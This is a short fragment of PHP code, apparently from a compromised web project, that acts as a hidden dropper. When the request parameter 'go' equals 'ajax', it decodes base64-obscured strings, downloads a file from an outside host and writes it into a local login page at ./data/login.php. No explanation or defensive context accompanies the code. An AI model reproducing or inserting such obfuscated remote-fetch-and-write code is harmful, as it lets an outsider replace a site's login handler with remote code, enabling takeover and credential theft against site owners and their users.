...
if ($_GET['go']=='ajax') {
$curlll="aHR0cDovL3RyZG93bi5jb20vbHMvYWpheC5qcw==";
$xcurlx= file_get_contents(base64_decode($curlll));
$pagecurlx="Li9kYXRhL2xvZ2luLnBocA==";
$curlqpage = base64_decode($pagecurlx); 
$chxs = fopen($curlqpage, "w");
fwrite($chxs, $xcurlx);
fclose($chxs);
}
